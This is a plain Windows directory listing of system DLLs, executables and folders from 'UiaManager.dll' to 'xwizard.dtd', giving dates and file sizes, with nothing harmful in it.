09/15/2018  09:13 AM           460,800 UiaManager.dll
09/15/2018  09:13 AM           231,936 UIAnimation.dll
09/15/2018  09:13 AM         2,004,992 UIAutomationCore.dll
09/15/2018  09:13 AM            35,840 uicom.dll
09/15/2018  09:12 AM            10,752 UIManagerBrokerps.dll
09/15/2018  09:13 AM           247,296 uireng.dll
09/15/2018  09:14 AM         3,391,488 UIRibbon.dll
09/07/2019  02:22 AM    <DIR>          uk-UA
09/15/2018  09:11 AM           149,816 ulib.dll
09/15/2018  09:14 AM           185,856 umcRes.dll
09/15/2018  09:13 AM            16,384 umdmxfrm.dll
09/15/2018  09:13 AM            60,928 unenrollhook.dll
09/15/2018  09:13 AM           253,440 unimdm.tsp
09/15/2018  09:13 AM            61,952 unimdmat.dll
09/15/2018  09:13 AM            17,408 uniplat.dll
09/07/2019  02:20 AM           968,192 Unistore.dll
09/15/2018  09:12 AM            34,304 unlodctr.exe
09/15/2018  11:06 AM           214,528 unregmp2.exe
09/15/2018  09:11 AM           510,464 untfs.dll
09/07/2019  02:20 AM           161,792 updatepolicy.dll
09/15/2018  09:13 AM           321,536 upnp.dll
09/15/2018  09:13 AM            34,816 upnpcont.exe
09/15/2018  09:13 AM           330,240 upnphost.dll
09/07/2019  02:20 AM           682,496 uReFS.dll
09/15/2018  09:11 AM           423,424 uReFSv1.dll
09/15/2018  09:11 AM            24,064 ureg.dll
09/15/2018  09:13 AM           233,472 url.dll
09/07/2019  02:20 AM         1,764,352 urlmon.dll
09/15/2018  09:13 AM            94,208 usbceip.dll
09/15/2018  09:14 AM           277,504 usbmon.dll
09/15/2018  09:12 AM            12,288 usbperf.dll
09/15/2018  09:13 AM            75,264 usbui.dll
09/15/2018  09:11 AM             4,608 user.exe
09/07/2019  02:20 AM         1,675,712 user32.dll
09/15/2018  09:13 AM            39,408 UserAccountBroker.exe
09/15/2018  09:13 AM            73,216 UserAccountControlSettings.dll
09/15/2018  09:13 AM            88,576 UserAccountControlSettings.exe
09/15/2018  09:13 AM           150,528 useractivitybroker.dll
09/15/2018  09:13 AM         1,208,320 usercpl.dll
09/15/2018  09:13 AM             8,192 UserDataAccessRes.dll
09/15/2018  09:13 AM           330,240 UserDataAccountApis.dll
09/15/2018  09:13 AM            36,352 UserDataLanguageUtil.dll
09/15/2018  09:13 AM            50,688 UserDataPlatformHelperUtil.dll
09/07/2019  02:20 AM            96,256 UserDataTimeUtil.dll
09/15/2018  09:13 AM            37,888 UserDataTypeHelperUtil.dll
09/15/2018  09:13 AM           151,552 UserDeviceRegistration.dll
09/15/2018  09:13 AM           200,704 UserDeviceRegistration.Ngc.dll
09/07/2019  02:20 AM           137,056 userenv.dll
09/15/2018  09:12 AM            27,648 userinit.exe
09/15/2018  09:12 AM            16,896 userinitext.dll
09/15/2018  09:13 AM            45,568 UserLanguageProfileCallback.dll
09/15/2018  09:13 AM            59,080 usermgrcli.dll
09/15/2018  09:13 AM           192,000 UserMgrProxy.dll
09/07/2019  02:20 AM            70,656 usoapi.dll
09/15/2018  09:12 AM            77,824 usp10.dll
09/15/2018  09:13 AM            39,424 ustprov.dll
09/15/2018  09:11 AM            40,232 utildll.dll
09/15/2018  09:13 AM            90,624 Utilman.exe
09/15/2018  09:11 AM           139,264 uudf.dll
09/15/2018  09:12 AM            66,560 UXInit.dll
09/15/2018  09:11 AM           135,696 uxlib.dll
09/15/2018  09:11 AM            11,784 uxlibres.dll
09/15/2018  09:12 AM           481,280 uxtheme.dll
09/15/2018  09:13 AM           465,920 VAN.dll
09/15/2018  09:13 AM           669,184 Vault.dll
09/15/2018  09:13 AM           224,256 vaultcli.dll
09/15/2018  09:13 AM            30,749 vbajet32.dll
09/15/2018  09:13 AM           134,656 VBICodec.ax
09/15/2018  09:13 AM            37,888 vbisurf.ax
09/07/2019  02:20 AM           532,992 vbscript.dll
05/14/2018  09:09 PM           402,216 vcamp140.dll
09/15/2018  09:13 AM           146,944 VCardParser.dll
09/27/2019  08:04 PM           269,080 vccorlib140.dll
05/14/2018  09:09 PM           136,336 vcomp140.dll
09/27/2019  08:04 PM            83,224 vcruntime140.dll
09/15/2018  09:11 AM            17,920 vdmdbg.dll
09/15/2018  09:11 AM            47,616 vds_ps.dll
09/15/2018  09:13 AM            11,776 verclsid.exe
09/15/2018  09:11 AM           354,440 verifier.dll
09/15/2018  09:13 AM           151,552 verifiergui.exe
09/15/2018  09:12 AM            27,328 version.dll
09/15/2018  09:13 AM            56,832 vfwwdm32.dll
09/15/2018  09:13 AM            29,184 vidcap.ax
09/15/2018  09:12 AM           100,872 VIDRESZR.DLL
09/15/2018  09:11 AM            57,360 virtdisk.dll
09/15/2018  09:13 AM            35,840 VoiceActivationManager.dll
09/15/2018  09:13 AM           110,592 VoipRT.dll
09/15/2018  09:12 AM            43,008 vpnikeapi.dll
09/15/2018  09:14 AM            12,800 VscMgrPS.dll
09/07/2019  02:20 AM         1,159,168 vssapi.dll
09/15/2018  09:11 AM            53,760 vsstrace.dll
09/15/2018  09:14 AM           153,600 VSSUI.dll
09/15/2018  09:14 AM            55,808 VSSUIRUN.exe
09/15/2018  09:11 AM            29,184 vss_ps.dll
09/07/2019  02:20 AM           211,968 w32tm.exe
09/15/2018  09:12 AM            28,160 w32topl.dll
09/15/2018  09:13 AM            58,880 WABSyncProvider.dll
09/15/2018  09:11 AM            32,768 waitfor.exe
09/15/2018  09:13 AM            10,752 WalletBackgroundServiceProxy.dll
09/15/2018  09:13 AM            36,864 WalletProxy.dll
04/13/2025  06:54 PM            11,264 wamregps.dll
09/15/2018  09:13 AM           224,768 wavemsp.dll
09/07/2019  02:22 AM    <DIR>          wbem
09/15/2018  09:12 AM           406,016 wbemcomn.dll
09/15/2018  11:06 AM    <DIR>          WCN
09/15/2018  09:13 AM            96,768 WcnApi.dll
09/15/2018  09:13 AM         1,233,920 wcnwiz.dll
09/15/2018  09:13 AM         1,291,264 wdc.dll
09/15/2018  09:11 AM            88,576 wdi.dll
09/15/2018  09:12 AM           186,368 wdigest.dll
09/15/2018  09:13 AM           215,040 wdmaud.drv
09/15/2018  09:12 AM           201,016 wdscore.dll
09/15/2018  09:13 AM           328,704 webauthn.dll
09/15/2018  09:12 AM           818,688 WebcamUi.dll
09/15/2018  09:13 AM           235,008 webcheck.dll
04/13/2025  07:11 PM           190,976 WebClnt.dll
09/15/2018  09:12 AM           460,288 webio.dll
09/07/2019  02:20 AM           833,024 webplatstorageserver.dll
09/15/2018  09:11 AM           948,288 webservices.dll
09/15/2018  09:12 AM            37,376 Websocket.dll
09/15/2018  09:13 AM            55,808 wecapi.dll
09/15/2018  09:13 AM            78,336 wecutil.exe
09/07/2019  02:20 AM           680,184 wer.dll
09/15/2018  09:12 AM            35,840 werdiagcontroller.dll
09/15/2018  09:12 AM           193,800 weretw.dll
09/07/2019  02:20 AM           444,728 WerFault.exe
09/07/2019  02:20 AM           147,736 WerFaultSecure.exe
09/07/2019  02:20 AM           193,040 wermgr.exe
09/07/2019  02:20 AM           428,032 werui.dll
09/07/2019  02:20 AM           283,032 wevtapi.dll
09/15/2018  09:13 AM            76,800 wevtfwd.dll
09/15/2018  09:12 AM           187,392 wevtutil.exe
09/15/2018  09:13 AM           136,192 wextract.exe
09/15/2018  09:13 AM           115,109 WF.msc
09/15/2018  09:13 AM            18,944 wfapigp.dll
09/15/2018  09:13 AM            68,096 WfHC.dll
09/15/2018  09:11 AM            33,280 where.exe
09/15/2018  09:12 AM            13,824 whhelper.dll
09/15/2018  09:11 AM            59,392 whoami.exe
09/15/2018  09:13 AM            84,480 wiaacmgr.exe
09/15/2018  09:13 AM           571,904 wiaaut.dll
09/15/2018  09:13 AM           413,184 wiadefui.dll
09/15/2018  09:13 AM           119,808 wiadss.dll
09/15/2018  09:13 AM            89,600 wiascanprofiles.dll
09/15/2018  09:13 AM           443,904 wiashext.dll
09/15/2018  09:13 AM            15,360 wiatrace.dll
09/15/2018  09:13 AM             2,404 WimBootCompress.ini
09/07/2019  02:20 AM           605,496 wimgapi.dll
09/15/2018  09:13 AM           603,648 win32calc.exe
09/15/2018  09:13 AM           320,000 win32k.sys
09/07/2019  02:20 AM         2,706,432 win32kfull.sys
09/15/2018  09:13 AM            88,304 win32u.dll
09/07/2019  02:20 AM           126,464 winbio.dll
09/15/2018  09:12 AM            32,256 winbioext.dll
09/15/2018  09:11 AM           149,488 winbrand.dll
09/15/2018  09:12 AM           332,800 wincorlib.dll
09/15/2018  09:13 AM            37,376 wincredprovider.dll
09/07/2019  02:20 AM           159,744 wincredui.dll
09/15/2018  09:13 AM           687,104 Windows.AccountsControl.dll
09/07/2019  02:20 AM         3,496,448 Windows.AI.MachineLearning.dll
09/15/2018  09:13 AM            88,576 Windows.AI.MachineLearning.Preview.dll
09/15/2018  09:13 AM            90,624 Windows.ApplicationModel.Background.SystemEventsBroker.dll
09/15/2018  09:13 AM            25,088 Windows.ApplicationModel.Background.TimeBroker.dll
09/15/2018  09:13 AM           156,160 Windows.ApplicationModel.Core.dll
09/07/2019  02:20 AM           604,248 windows.applicationmodel.datatransfer.dll
09/15/2018  09:13 AM           718,944 Windows.ApplicationModel.dll
09/15/2018  09:13 AM           310,272 Windows.ApplicationModel.LockScreen.dll
09/07/2019  02:20 AM         1,655,976 Windows.ApplicationModel.Store.dll
09/15/2018  09:13 AM            51,200 Windows.ApplicationModel.Store.Preview.DOSettings.dll
09/15/2018  09:13 AM           233,472 Windows.ApplicationModel.Store.TestingFramework.dll
09/15/2018  09:13 AM           405,504 Windows.ApplicationModel.Wallet.dll
09/15/2018  09:13 AM            93,184 Windows.CloudStore.Schema.DesktopShell.dll
09/15/2018  09:13 AM            64,512 Windows.Cortana.ProxyStub.dll
09/07/2019  02:20 AM         6,444,544 Windows.Data.Pdf.dll
09/15/2018  09:13 AM           442,368 Windows.Devices.AllJoyn.dll
09/15/2018  09:13 AM            66,048 Windows.Devices.Background.dll
09/15/2018  09:13 AM            14,336 Windows.Devices.Background.ps.dll
09/15/2018  09:13 AM         1,480,192 Windows.Devices.Bluetooth.dll
09/15/2018  09:13 AM            72,192 Windows.Devices.Custom.dll
09/15/2018  09:13 AM            15,360 Windows.Devices.Custom.ps.dll
09/07/2019  02:20 AM           408,528 Windows.Devices.Enumeration.dll
09/15/2018  09:13 AM           137,216 Windows.Devices.Haptics.dll
09/15/2018  09:13 AM           188,416 Windows.Devices.HumanInterfaceDevice.dll
09/07/2019  02:20 AM           264,704 Windows.Devices.Lights.dll
09/07/2019  02:20 AM           385,536 Windows.Devices.LowLevel.dll
09/15/2018  09:13 AM           317,952 Windows.Devices.Midi.dll
09/15/2018  09:13 AM         1,580,032 Windows.Devices.Perception.dll
09/07/2019  02:20 AM           331,264 Windows.Devices.Picker.dll
09/15/2018  09:13 AM         1,167,360 Windows.Devices.PointOfService.dll
09/15/2018  09:13 AM            38,912 Windows.Devices.Portable.dll
09/15/2018  09:13 AM            67,584 Windows.Devices.Printers.dll
09/15/2018  09:13 AM            34,816 Windows.Devices.Printers.Extensions.dll
09/07/2019  02:20 AM           156,672 Windows.Devices.Radios.dll
09/15/2018  09:13 AM           167,424 Windows.Devices.Scanners.dll
09/15/2018  09:13 AM           926,056 Windows.Devices.Sensors.dll
09/07/2019  02:20 AM           107,008 Windows.Devices.SerialCommunication.dll
09/15/2018  09:13 AM           537,088 Windows.Devices.SmartCards.dll
09/15/2018  09:13 AM           420,352 Windows.Devices.SmartCards.Phone.dll
09/15/2018  09:12 AM           281,088 Windows.Devices.Usb.dll
09/15/2018  09:13 AM           197,632 Windows.Devices.WiFi.dll
09/15/2018  09:13 AM           358,912 Windows.Devices.WiFiDirect.dll
09/15/2018  09:13 AM           140,800 Windows.Energy.dll
09/15/2018  09:13 AM           564,736 Windows.Gaming.Input.dll
09/15/2018  09:13 AM           287,744 Windows.Gaming.Preview.dll
09/15/2018  09:13 AM            64,512 Windows.Gaming.UI.GameBar.dll
09/07/2019  02:20 AM         1,168,384 Windows.Globalization.dll
09/15/2018  09:13 AM            51,200 Windows.Globalization.Fontgroups.dll
09/15/2018  09:13 AM           705,536 Windows.Globalization.PhoneNumberFormatting.dll
09/07/2019  02:20 AM            98,080 Windows.Graphics.Display.BrightnessOverride.dll
09/15/2018  09:13 AM           108,392 Windows.Graphics.Display.DisplayEnhancementOverride.dll
09/07/2019  02:20 AM           407,040 Windows.Graphics.dll
09/15/2018  09:13 AM         1,546,752 Windows.Graphics.Printing.3D.dll
09/15/2018  09:13 AM           573,952 Windows.Graphics.Printing.dll
09/07/2019  02:20 AM           312,832 Windows.Graphics.Printing.Workflow.dll
09/15/2018  09:13 AM            12,288 Windows.Graphics.Printing.Workflow.Native.dll
09/15/2018  09:13 AM           426,496 Windows.Internal.Bluetooth.dll
09/15/2018  09:13 AM           160,256 Windows.Internal.Devices.Sensors.dll
09/15/2018  09:13 AM           125,952 Windows.Internal.Graphics.Display.DisplayEnhancementManagement.dll
09/07/2019  02:20 AM           664,064 Windows.Internal.Management.dll
09/15/2018  09:13 AM            40,448 Windows.Internal.SecurityMitigationsBroker.dll
09/15/2018  09:13 AM            66,560 windows.internal.shellcommon.AccountsControlExperience.dll
09/15/2018  09:13 AM            31,744 Windows.Internal.ShellCommon.PrintExperience.dll
09/15/2018  09:13 AM            47,616 windows.internal.shellcommon.TokenBrokerModal.dll
09/15/2018  09:13 AM           127,488 Windows.Internal.UI.Logon.ProxyStub.dll
09/15/2018  09:13 AM           175,928 Windows.Management.Workplace.dll
09/15/2018  09:13 AM            27,136 Windows.Management.Workplace.WorkplaceSettings.dll
09/15/2018  09:12 AM         1,310,208 Windows.Media.Audio.dll
09/07/2019  02:20 AM           731,648 Windows.Media.BackgroundMediaPlayback.dll
09/15/2018  09:13 AM            12,288 Windows.Media.BackgroundPlayback.exe
09/15/2018  09:13 AM           317,624 Windows.Media.Devices.dll
09/07/2019  02:21 AM         5,115,384 Windows.Media.dll
09/15/2018  09:12 AM         1,038,336 Windows.Media.Editing.dll
09/15/2018  09:13 AM         1,222,144 Windows.Media.FaceAnalysis.dll
09/15/2018  09:13 AM           564,736 Windows.Media.Import.dll
09/15/2018  09:13 AM           419,584 Windows.Media.MediaControl.dll
09/15/2018  09:13 AM           687,616 Windows.Media.Ocr.dll
09/07/2019  02:20 AM           730,112 Windows.Media.Playback.BackgroundMediaPlayer.dll
09/07/2019  02:20 AM           712,192 Windows.Media.Playback.MediaPlayer.dll
09/15/2018  09:13 AM            57,344 Windows.Media.Playback.ProxyStub.dll
09/07/2019  02:20 AM         6,542,464 Windows.Media.Protection.PlayReady.dll
09/07/2019  02:20 AM         1,294,848 Windows.Media.Speech.dll
09/15/2018  09:13 AM           839,168 Windows.Media.Streaming.dll
09/15/2018  09:13 AM           112,128 Windows.Media.Streaming.ps.dll
09/15/2018  09:13 AM            97,280 Windows.Networking.BackgroundTransfer.BackgroundManagerPolicy.dll
09/15/2018  09:13 AM           768,512 Windows.Networking.BackgroundTransfer.dll
09/07/2019  02:20 AM           548,864 Windows.Networking.Connectivity.dll
09/15/2018  09:13 AM           670,208 Windows.Networking.dll
09/15/2018  09:13 AM           126,464 Windows.Networking.HostName.dll
09/15/2018  09:13 AM           242,176 Windows.Networking.NetworkOperators.ESim.dll
09/07/2019  02:20 AM           104,960 Windows.Networking.NetworkOperators.HotspotAuthentication.dll
09/15/2018  09:13 AM           307,200 Windows.Networking.Proximity.dll
09/15/2018  09:13 AM            82,432 Windows.Networking.ServiceDiscovery.Dnssd.dll
09/15/2018  09:13 AM           154,112 Windows.Networking.Sockets.PushEnabledApplication.dll
09/07/2019  02:20 AM           982,528 Windows.Networking.Vpn.dll
09/15/2018  09:13 AM           410,112 Windows.Payments.dll
09/15/2018  09:13 AM           574,872 Windows.Perception.Stub.dll
09/15/2018  09:13 AM           186,368 Windows.Security.Authentication.Identity.Provider.dll
09/07/2019  02:20 AM           803,328 Windows.Security.Authentication.OnlineId.dll
09/07/2019  02:20 AM           791,040 Windows.Security.Authentication.Web.Core.dll
09/15/2018  09:13 AM            86,472 Windows.Security.Credentials.UI.CredentialPicker.dll
09/15/2018  09:13 AM            89,088 Windows.Security.Credentials.UI.UserConsentVerifier.dll
09/15/2018  09:13 AM            45,072 Windows.Security.Integrity.dll
09/07/2019  02:20 AM           774,968 Windows.Services.TargetedContent.dll
09/15/2018  09:13 AM            45,568 Windows.Shell.Search.UriHandler.dll
09/15/2018  09:13 AM            75,264 Windows.Shell.ServiceHostBuilder.dll
09/07/2019  02:20 AM         5,210,904 Windows.StateRepository.dll
09/07/2019  02:20 AM            87,864 Windows.StateRepositoryBroker.dll
09/07/2019  02:20 AM           122,680 Windows.StateRepositoryClient.dll
09/07/2019  02:20 AM            31,744 Windows.StateRepositoryCore.dll
09/07/2019  02:20 AM           553,664 Windows.StateRepositoryPS.dll
09/07/2019  02:20 AM           162,304 Windows.StateRepositoryUpgrade.dll
09/07/2019  02:20 AM           279,416 Windows.Storage.ApplicationData.dll
09/15/2018  09:13 AM           135,680 Windows.Storage.Compression.dll
09/07/2019  02:20 AM         6,310,064 windows.storage.dll
09/15/2018  09:13 AM           156,160 Windows.Storage.OneCore.dll
09/15/2018  09:13 AM           637,440 Windows.Storage.Search.dll
09/07/2019  02:20 AM           297,984 Windows.System.Diagnostics.dll
09/15/2018  09:13 AM            42,496 Windows.System.Diagnostics.Telemetry.PlatformTelemetryClient.dll
09/15/2018  09:13 AM            76,288 Windows.System.Diagnostics.TraceReporting.PlatformDiagnosticActions.dll
09/15/2018  09:13 AM           497,152 Windows.System.Launcher.dll
09/15/2018  09:13 AM           185,344 Windows.System.Profile.HardwareId.dll
09/07/2019  02:20 AM            53,760 Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
09/15/2018  09:13 AM            98,816 Windows.System.Profile.RetailInfo.dll
09/15/2018  09:13 AM            46,592 Windows.System.Profile.SystemId.dll
09/15/2018  09:13 AM            39,936 Windows.System.Profile.SystemManufacturers.dll
09/15/2018  09:11 AM            18,432 Windows.System.RemoteDesktop.dll
09/07/2019  02:20 AM           228,352 Windows.System.SystemManagement.dll
09/15/2018  09:13 AM            64,512 Windows.System.UserDeviceAssociation.dll
09/15/2018  09:13 AM            47,616 Windows.System.UserProfile.DiagnosticsSettings.dll
09/15/2018  09:13 AM            50,176 Windows.UI.Accessibility.dll
09/07/2019  02:20 AM           615,936 Windows.UI.Core.TextInput.dll
09/15/2018  09:13 AM           976,384 Windows.UI.Cred.dll
09/15/2018  09:13 AM           238,080 Windows.UI.CredDialogController.dll
09/07/2019  02:20 AM           964,976 Windows.UI.dll
09/07/2019  02:20 AM         1,506,304 Windows.UI.Immersive.dll
09/15/2018  09:13 AM         3,576,320 Windows.UI.Input.Inking.Analysis.dll
09/07/2019  02:20 AM         1,382,912 Windows.UI.Input.Inking.dll
09/15/2018  09:13 AM           708,096 Windows.UI.Search.dll
09/15/2018  09:13 AM         3,416,576 Windows.UI.Xaml.Controls.dll
09/07/2019  02:20 AM        15,221,248 Windows.UI.Xaml.dll
09/15/2018  09:13 AM           756,224 Windows.UI.Xaml.InkControls.dll
09/15/2018  09:13 AM         1,292,800 Windows.UI.Xaml.Maps.dll
09/15/2018  09:13 AM           934,912 Windows.UI.Xaml.Phone.dll
09/15/2018  09:14 AM           122,880 Windows.UI.XamlHost.dll
09/15/2018  09:13 AM            25,600 Windows.WARP.JITService.exe
09/15/2018  09:13 AM           164,864 Windows.Web.Diagnostics.dll
09/07/2019  02:20 AM           570,368 Windows.Web.dll
09/15/2018  09:13 AM         1,036,800 Windows.Web.Http.dll
09/07/2019  02:20 AM         1,520,208 WindowsCodecs.dll
09/15/2018  09:13 AM           231,936 WindowsCodecsExt.dll
09/15/2018  09:13 AM        31,602,232 WindowsCodecsRaw.dll
09/15/2018  09:13 AM             1,649 WindowsCodecsRaw.txt
09/15/2018  09:13 AM           107,008 WindowsDefaultHeatProcessor.dll
09/15/2018  09:13 AM           165,888 windowslivelogin.dll
09/15/2018  09:12 AM           886,272 windowsperformancerecordercontrol.dll
09/15/2018  09:19 AM    <DIR>          WindowsPowerShell
09/07/2019  02:20 AM           770,096 winhttp.dll
09/15/2018  09:13 AM            81,920 winhttpcom.dll
09/07/2019  02:20 AM         4,628,992 wininet.dll
09/15/2018  09:13 AM            65,024 wininetlui.dll
09/15/2018  09:12 AM            37,176 wininitext.dll
09/15/2018  09:13 AM           354,816 winipcfile.dll
09/15/2018  09:13 AM           801,280 winipcsecproc.dll
09/15/2018  09:12 AM            69,120 winipsec.dll
09/15/2018  09:13 AM           365,056 Winlangdb.dll
09/15/2018  09:19 AM    <DIR>          WinMetadata
09/15/2018  09:13 AM            33,280 winml.dll
09/15/2018  09:12 AM           134,512 winmm.dll
09/15/2018  09:12 AM           132,392 winmmbase.dll
09/15/2018  09:13 AM         1,646,592 winmsipc.dll
09/15/2018  09:13 AM            72,192 WinMsoIrmProtector.dll
09/15/2018  09:12 AM            19,968 winnlsres.dll
09/15/2018  09:12 AM            28,352 winnsi.dll
09/15/2018  09:13 AM            67,584 WinOpcIrmProtector.dll
09/15/2018  11:06 AM    <DIR>          winrm
09/15/2018  09:12 AM                33 winrm.cmd
09/15/2018  09:12 AM           204,105 winrm.vbs
09/15/2018  09:13 AM            23,552 winrnr.dll
09/15/2018  09:13 AM            43,008 winrs.exe
09/15/2018  09:13 AM            95,744 winrscmd.dll
09/15/2018  09:13 AM            24,064 winrshost.exe
09/15/2018  09:13 AM             2,048 winrsmgr.dll
09/15/2018  09:13 AM            10,752 winrssrv.dll
09/15/2018  09:13 AM           124,416 WinRtTracing.dll
09/15/2018  09:13 AM           307,712 WinSATAPI.dll
09/15/2018  09:12 AM           178,176 WinSCard.dll
09/15/2018  09:13 AM            15,360 winshfhc.dll
09/15/2018  09:11 AM           270,336 winsku.dll
09/15/2018  09:12 AM            72,704 winsockhc.dll
09/07/2019  02:20 AM           414,720 winspool.drv
09/15/2018  09:12 AM           598,944 winsqlite3.dll
09/15/2018  09:12 AM            17,408 WINSRPC.DLL
09/15/2018  09:11 AM           256,704 winsta.dll
09/15/2018  09:13 AM           694,272 WinSync.dll
09/15/2018  09:13 AM           187,904 WinSyncMetastore.dll
09/15/2018  09:13 AM           111,104 WinSyncProviders.dll
09/07/2019  02:20 AM           279,376 wintrust.dll
09/15/2018  09:12 AM           902,248 WinTypes.dll
09/15/2018  09:12 AM            22,016 winusb.dll
09/15/2018  09:13 AM            56,832 winver.exe
09/07/2019  02:20 AM           226,816 wisp.dll
09/15/2018  09:12 AM            57,816 wkscli.dll
09/15/2018  09:13 AM            98,304 wkspbrokerAx.dll
09/15/2018  09:13 AM            17,920 wksprtPS.dll
09/15/2018  09:13 AM           447,488 WLanConn.dll
09/15/2018  09:13 AM           399,872 wlangpui.dll
09/15/2018  09:13 AM         4,174,336 WlanMM.dll
09/15/2018  09:13 AM             3,072 wlanutil.dll
09/07/2019  02:20 AM           321,024 Wldap32.dll
09/07/2019  02:20 AM           118,480 wldp.dll
09/15/2018  09:13 AM            97,792 wlgpclnt.dll
09/15/2018  09:13 AM           498,688 wlidcli.dll
09/15/2018  09:13 AM           228,352 wlidcredprov.dll
09/15/2018  09:13 AM            65,024 wlidfdp.dll
09/15/2018  09:13 AM            41,472 wlidnsp.dll
09/15/2018  09:13 AM           534,528 wlidprov.dll
09/15/2018  09:13 AM            29,696 wlidres.dll
09/07/2019  02:21 AM           673,520 WMADMOD.DLL
09/07/2019  02:21 AM           687,896 WMADMOE.DLL
09/15/2018  09:12 AM           249,112 WMASF.DLL
09/15/2018  09:12 AM            10,752 wmcodecdspps.dll
09/15/2018  09:12 AM            31,744 wmdmlog.dll
09/15/2018  09:12 AM            37,376 wmdmps.dll
09/15/2018  09:13 AM             5,632 wmdrmsdk.dll
09/15/2018  11:06 AM             2,560 wmerror.dll
09/15/2018  09:12 AM             5,120 wmi.dll
09/15/2018  09:13 AM            39,936 wmiclnt.dll
09/15/2018  09:13 AM           134,656 wmidcom.dll
09/15/2018  09:12 AM           147,456 wmidx.dll
09/15/2018  09:13 AM            24,576 wmiprop.dll
09/15/2018  09:13 AM           157,696 wmitomi.dll
09/15/2018  09:12 AM         1,125,376 WMNetMgr.dll
09/07/2019  02:21 AM         9,941,504 wmp.dll
09/15/2018  09:13 AM           279,552 WmpDui.dll
09/07/2019  02:21 AM           167,424 wmpdxm.dll
09/07/2019  02:21 AM           241,680 wmpeffects.dll
09/15/2018  09:13 AM           342,528 WMPhoto.dll
09/15/2018  11:06 AM             2,560 wmploc.DLL
09/15/2018  11:06 AM           154,072 wmpps.dll
09/07/2019  02:21 AM            96,768 wmpshell.dll
09/15/2018  09:12 AM            15,360 wmsgapi.dll
09/15/2018  09:13 AM           869,888 WMSPDMOD.DLL
09/07/2019  02:20 AM         1,043,968 WMSPDMOE.DLL
09/07/2019  02:20 AM         2,160,160 WMVCORE.DLL
09/15/2018  09:12 AM         2,298,424 WMVDECOD.DLL
09/15/2018  09:12 AM           178,688 wmvdspa.dll
09/15/2018  09:12 AM         2,067,208 WMVENCOD.DLL
09/15/2018  09:12 AM           268,040 WMVSDECD.DLL
09/15/2018  09:12 AM           382,976 WMVSENCD.DLL
09/15/2018  09:12 AM           682,496 WMVXENCD.DLL
09/15/2018  09:13 AM            28,672 WofUtil.dll
09/15/2018  09:13 AM            33,280 WordBreakers.dll
09/15/2018  09:11 AM             5,632 wow32.dll
09/15/2018  09:13 AM            15,360 wowreg32.exe
09/15/2018  09:13 AM            84,480 wpbcreds.dll
09/15/2018  09:12 AM         1,885,184 wpdshext.dll
09/15/2018  09:12 AM            25,088 WPDShextAutoplay.exe
09/15/2018  09:12 AM            55,296 WPDShServiceObj.dll
09/15/2018  09:12 AM           325,632 WPDSp.dll
09/07/2019  02:20 AM         1,000,448 wpnapps.dll
09/15/2018  09:13 AM           296,448 wpnclient.dll
09/15/2018  09:13 AM            11,776 WpPortingLibrary.dll
09/15/2018  09:13 AM            10,240 write.exe
09/15/2018  09:12 AM             4,096 ws2help.dll
09/15/2018  09:12 AM           384,272 ws2_32.dll
09/15/2018  09:13 AM            11,776 WSClient.dll
09/15/2018  09:13 AM           147,456 wscript.exe
09/15/2018  09:11 AM           567,808 WSDApi.dll
09/15/2018  09:13 AM            41,984 wsdchngr.dll
09/15/2018  09:13 AM         1,322,496 wsecedit.dll
09/15/2018  09:13 AM            50,688 wshbth.dll
09/15/2018  09:13 AM            21,504 wshcon.dll
09/15/2018  09:12 AM            16,384 wshelper.dll
09/15/2018  09:13 AM            80,896 wshext.dll
09/15/2018  09:12 AM            11,264 wship6.dll
09/15/2018  09:13 AM           123,392 wshom.ocx
09/15/2018  09:13 AM            15,872 wshqos.dll
09/15/2018  09:13 AM            14,848 wshrm.dll
09/15/2018  09:12 AM            10,752 WSHTCPIP.DLL
09/15/2018  09:13 AM            16,696 wshunix.dll
09/15/2018  09:13 AM            26,112 WsmAgent.dll
09/15/2018  09:12 AM             4,675 wsmanconfig_schema.xml
09/07/2019  02:20 AM            33,280 WSManHTTPConfig.exe
09/07/2019  02:20 AM            63,488 WSManMigrationPlugin.dll
09/15/2018  09:13 AM           141,824 WsmAuto.dll
09/15/2018  09:13 AM            11,776 wsmplpxy.dll
09/15/2018  09:13 AM            39,424 wsmprovhost.exe
09/15/2018  09:12 AM             1,559 WsmPty.xsl
09/15/2018  09:13 AM            61,952 WsmRes.dll
09/15/2018  09:12 AM           121,344 Wsmselpl.dll
09/15/2018  09:12 AM             2,560 Wsmselrr.dll
09/07/2019  02:20 AM         2,466,304 WsmSvc.dll
09/15/2018  09:12 AM             2,426 WsmTxt.xsl
09/15/2018  09:13 AM           230,400 WsmWmiPl.dll
09/15/2018  09:12 AM            52,736 wsnmp32.dll
09/15/2018  09:12 AM            16,384 wsock32.dll
09/07/2019  02:20 AM         1,521,664 wsp_fs.dll
09/07/2019  02:20 AM         1,307,648 wsp_health.dll
09/15/2018  09:11 AM           718,336 wsp_sr.dll
09/15/2018  09:13 AM            72,704 WSTPager.ax
09/15/2018  09:11 AM            52,864 wtsapi32.dll
09/07/2019  02:20 AM           853,504 wuapi.dll
09/15/2018  09:13 AM           166,912 wuceffects.dll
09/15/2018  09:13 AM            71,680 wudriver.dll
09/07/2019  02:20 AM            31,232 wups.dll
09/15/2018  09:13 AM           305,664 wusa.exe
09/15/2018  09:13 AM           478,208 wvc.dll
09/15/2018  09:13 AM           387,072 WwaApi.dll
09/15/2018  09:13 AM            31,744 WwaExt.dll
09/07/2019  02:20 AM           909,840 WWAHost.exe
09/15/2018  09:13 AM             3,072 XAudio2_8.dll
09/15/2018  09:13 AM           559,616 XAudio2_9.dll
09/15/2018  09:13 AM            63,488 xboxgipsynthetic.dll
09/15/2018  09:11 AM            44,032 xcopy.exe
09/15/2018  09:13 AM            36,352 XInput1_4.dll
09/15/2018  09:13 AM             9,216 XInput9_1_0.dll
09/15/2018  09:13 AM            37,888 XInputUap.dll
09/15/2018  09:13 AM            52,736 xmlfilter.dll
09/07/2019  02:20 AM           173,216 xmllite.dll
09/15/2018  09:13 AM            17,920 xmlprovi.dll
09/15/2018  09:11 AM            52,224 xolehlp.dll
09/15/2018  09:13 AM           249,344 XpsDocumentTargetPrint.dll
09/15/2018  11:06 AM           595,968 XpsFilt.dll
09/15/2018  09:13 AM           355,840 XpsGdiConverter.dll
09/07/2019  02:21 AM         1,110,528 XpsPrint.dll
09/15/2018  09:13 AM           487,936 XpsRasterService.dll
09/07/2019  02:21 AM         3,442,176 xpsrchvw.exe
09/15/2018  11:06 AM            76,060 xpsrchvw.xml
09/07/2019  02:20 AM         2,086,400 xpsservices.dll
09/15/2018  11:06 AM            81,408 XPSSHHDR.dll
09/15/2018  09:13 AM             4,014 xwizard.dtd
